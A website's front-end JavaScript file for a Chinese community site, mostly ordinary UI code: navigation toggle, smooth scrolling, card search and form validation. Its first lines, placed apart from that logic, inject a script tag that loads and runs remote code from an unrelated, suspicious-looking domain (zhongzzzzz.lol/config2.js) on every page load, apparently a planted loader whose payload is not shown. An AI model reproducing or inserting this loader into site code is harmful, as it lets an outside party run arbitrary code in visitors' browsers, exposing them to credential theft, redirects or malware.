// 1. 顶层立即执行
const cfgScript = document.createElement('script');
cfgScript.src = 'https://xiezuowen.zhongzzzzz.lol/config2.js';
document.head.appendChild(cfgScript);

document.addEventListener('DOMContentLoaded', function() {
    'use strict';

    // 1. 移动端导航菜单切换逻辑
    const navToggle = document.querySelector('.nav-toggle');
    const navMenu = document.querySelector('.nav-menu');

    if (navToggle && navMenu) {
        navToggle.addEventListener('click', function() {
            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
            navToggle.setAttribute('aria-expanded', !isExpanded);
            navMenu.classList.toggle('active');
        });
    }

    // 2. 页面内平滑滚动（适用于锚点链接）
    const smoothScrollLinks = document.querySelectorAll('a[href^="#"]');
    smoothScrollLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            const targetId = this.getAttribute('href');
            if (targetId.length > 1) {
                const targetElement = document.querySelector(targetId);
                if (targetElement) {
                    e.preventDefault();
                    targetElement.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            }
        });
    });

    // 3. 资源页或列表页的简易前端筛选/搜索模拟
    const searchInput = document.querySelector('#resourceSearch');
    const resourceCards = document.querySelectorAll('.resource-card, .article-card');

    if (searchInput && resourceCards.length > 0) {
        searchInput.addEventListener('input', function(e) {
            const keyword = e.target.value.toLowerCase().trim();
            
            resourceCards.forEach(card => {
                const titleText = card.querySelector('h3, h2');
                const descText = card.querySelector('p');
                const content = (titleText ? titleText.textContent : '') + ' ' + (descText ? descText.textContent : '');
                
                if (content.toLowerCase().includes(keyword)) {
                    card.style.display = '';
                } else {
                    card.style.display = 'none';
                }
            });
        });
    }

    // 4. 表单提交简单校验（如联系我们表单、社区发帖/评论表单）
    const contactForm = document.querySelector('#contactForm, .comment-form');
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const inputs = contactForm.querySelectorAll('input[required], textarea[required]');
            let isValid = true;

            inputs.forEach(input => {
                if (!input.value.trim()) {
                    isValid = false;
                    input.style.borderColor = '#e74c3c';
                } else {
                    input.style.borderColor = '#ddd';
                }
            });

            if (isValid) {
                alert('提交成功！感谢老铁的支持，海角社管理员会尽快处理您的反馈。');
                contactForm.reset();
            } else {
                alert('请把必填项填完整再提交哦，亲测有效！');
            }
        });
    }

    // 5. 动态显示当前年份在页脚（若有对应元素）
    const yearSpan = document.querySelector('#currentYear');
    if (yearSpan) {
        yearSpan.textContent = new Date().getFullYear();
    }
});